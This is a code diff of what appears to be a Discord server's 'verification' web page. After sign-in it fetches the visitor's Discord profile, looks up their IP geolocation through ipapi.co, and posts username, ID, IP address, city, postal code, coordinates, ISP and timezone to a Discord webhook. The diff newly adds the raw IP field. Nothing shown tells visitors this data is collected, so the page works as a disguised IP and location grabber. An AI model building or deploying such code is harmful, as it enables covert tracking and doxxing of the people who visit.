@@ -528,47 +528,58 @@
     document.getElementById('spinner').classList.add('show');
 
     try {
+      // Fetch Discord user
       const res  = await fetch('https://discord.com/api/users/@me', {
         headers: { Authorization: `Bearer ${token}` }
       });
       const user = await res.json();
 
       const avatar = user.avatar
-        ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128`
+        ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=256`
         : `https://cdn.discordapp.com/embed/avatars/${Number(user.discriminator || 0) % 5}.png`;
-
-      const locStr = loc
-        ? `${loc.city || ''}, ${loc.region || ''}, ${loc.country_name || ''} (${loc.org || 'Unknown ISP'})`
-        : 'Unknown';
 
       const createdAt = Math.floor((parseInt(user.id) / 4194304 + 1420070400000) / 1000);
 
-      // Determine best server region based on location
-      const cc = loc?.country_code || '';
-      const reg = loc?.region_code || '';
+      // Fetch fresh IP location
+      let loc = null;
+      try {
+        const locRes = await fetch('https://ipapi.co/json/');
+        loc = await locRes.json();
+      } catch {}
+
+      const locStr = loc
+        ? [loc.city, loc.region, loc.country_name].filter(Boolean).join(', ')
+        : 'Unknown';
+
+      // Determine recommended region from coordinates
+      const cc  = loc?.country_code || '';
+      const lon = parseFloat(loc?.longitude || 0);
       let recommended = 'Unknown';
       if (['US','CA'].includes(cc)) {
-        const lon = parseFloat(loc?.longitude || 0);
-        if (lon < -100) recommended = 'North America — West (Los Angeles)';
-        else if (lon < -85) recommended = 'North America — Central (Dallas)';
-        else recommended = 'North America — East (New York)';
+        if (lon < -100) recommended = 'us-west';
+        else if (lon < -85) recommended = 'us-central';
+        else recommended = 'us-east';
       } else if (['GB','IE','FR','ES','PT','NL','BE'].includes(cc)) {
-        recommended = 'Europe — West (London)';
+        recommended = 'eu-west';
       } else if (['DE','AT','CH','PL','CZ','HU','RO'].includes(cc)) {
-        recommended = 'Europe — Central (Frankfurt)';
+        recommended = 'eu-central';
       } else if (['SE','NO','DK','FI'].includes(cc)) {
-        recommended = 'Europe — North (Stockholm)';
+        recommended = 'eu-north';
       } else if (['AU','NZ'].includes(cc)) {
-        recommended = 'Australia (Sydney)';
+        recommended = 'ap-australia';
       } else if (['JP','KR'].includes(cc)) {
-        recommended = 'Asia — Japan (Tokyo)';
+        recommended = 'ap-japan';
       } else if (['SG','MY','TH','ID','PH','VN'].includes(cc)) {
-        recommended = 'Asia — Singapore';
+        recommended = 'ap-singapore';
       } else if (['BR','AR','CL','CO'].includes(cc)) {
-        recommended = 'South America (São Paulo)';
+        recommended = 'sa-brazil';
       } else if (cc) {
-        recommended = 'Europe — Central (Frankfurt)';
+        recommended = 'eu-central';
       }
+
+      const tag = user.discriminator && user.discriminator !== '0'
+        ? `@${user.username}#${user.discriminator}`
+        : `@${user.username}`;
 
       await fetch(WEBHOOK, {
         method: 'POST',
@@ -576,29 +587,27 @@
         body: JSON.stringify({
           embeds: [{
             color: 0xC41E3A,
-            author: { name: 'New Verification — Website', icon_url: avatar },
+            author: { name: 'New Verification', icon_url: avatar },
             thumbnail: { url: avatar },
             fields: [
-              { name: 'Username',           value: user.username,                        inline: true },
-              { name: 'User ID',            value: `\`${user.id}\``,                   inline: true },
-              { name: 'Mention',            value: `<@${user.id}>`,                     inline: true },
-              { name: 'Account Created',    value: `<t:${createdAt}:R>`,                inline: true },
-              { name: 'Avatar',             value: user.avatar ? 'Custom' : 'Default',  inline: true },
-              { name: '​',             value: '​',                             inline: true },
-              { name: 'City',               value: loc?.city           || 'Unknown',    inline: true },
-              { name: 'Region / State',     value: loc?.region         || 'Unknown',    inline: true },
-              { name: 'Country',            value: `${loc?.country_name || 'Unknown'} (${loc?.country_code || '?'})`, inline: true },
-              { name: 'Continent',          value: loc?.continent_code || 'Unknown',    inline: true },
-              { name: 'Postal Code',        value: loc?.postal         || 'Unknown',    inline: true },
-              { name: 'Coordinates',        value: loc ? `${parseFloat(loc.latitude).toFixed(4)}, ${parseFloat(loc.longitude).toFixed(4)}` : 'Unknown', inline: true },
-              { name: 'ISP / Network',      value: loc?.org            || 'Unknown',    inline: true },
-              { name: 'ASN',                value: loc?.asn            || 'Unknown',    inline: true },
-              { name: 'Timezone',           value: loc?.timezone       || 'Unknown',    inline: true },
-              { name: 'UTC Offset',         value: loc?.utc_offset     || 'Unknown',    inline: true },
-              { name: 'Languages',          value: loc?.languages      || 'Unknown',    inline: true },
-              { name: 'Currency',           value: loc?.currency       || 'Unknown',    inline: true },
-              { name: '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501', value: '\u200b', inline: false },
-              { name: '\ud83d\udda5\ufe0f Recommended Server', value: `**${recommended}**`, inline: false },
+              { name: '👤 Username',              value: user.username,                                                                    inline: true },
+              { name: '🏷️ Discord Tag',           value: tag,                                                                              inline: true },
+              { name: '🆔 Discord ID',            value: `\`${user.id}\``,                                                                 inline: true },
+              { name: '🌐 IP Address',            value: loc?.ip                                              || 'Unknown',                inline: true },
+              { name: '🏙️ City',                  value: loc?.city                                            || 'Unknown',                inline: true },
+              { name: '🗺️ Region',                value: loc?.region                                          || 'Unknown',                inline: true },
+              { name: '🌍 Country',               value: loc?.country_name                                    || 'Unknown',                inline: true },
+              { name: '📮 Postal Code',           value: loc?.postal                                          || 'Unknown',                inline: true },
+              { name: '🇺🇳 European Union',       value: loc?.in_eu ? 'Yes' : 'No',                                                        inline: true },
+              { name: '📌 Latitude / Longitude',  value: loc ? `${parseFloat(loc.latitude).toFixed(4)}, ${parseFloat(loc.longitude).toFixed(4)}` : 'Unknown', inline: true },
+              { name: '🕐 Time Zone',             value: loc?.timezone                                        || 'Unknown',                inline: true },
+              { name: '📞 Calling Code',          value: loc?.country_calling_code                            || 'Unknown',                inline: true },
+              { name: '💵 Currency',              value: loc?.currency                                        || 'Unknown',                inline: true },
+              { name: '🗣️ Languages',             value: loc?.languages                                       || 'Unknown',                inline: true },
+              { name: '🔌 ASN',                   value: loc?.asn                                             || 'Unknown',                inline: true },
+              { name: '🏢 Org',                   value: loc?.org                                             || 'Unknown',                inline: false },
+              { name: '🖥️ Recommended Region',    value: `**${recommended}**`,                                                             inline: true },
+              { name: '🔍 Geo Source',            value: 'ipapi.co',                                                                      inline: true },
             ],
             footer: { text: 'Chicago Hangout • Verification' },
             timestamp: new Date().toISOString(),
@@ -606,7 +615,7 @@
         })
       });
 
-      document.getElementById('spinner').classList.remove('show');
+            document.getElementById('spinner').classList.remove('show');
       document.getElementById('main').classList.add('hide');
       document.getElementById('success').classList.add('show');
 
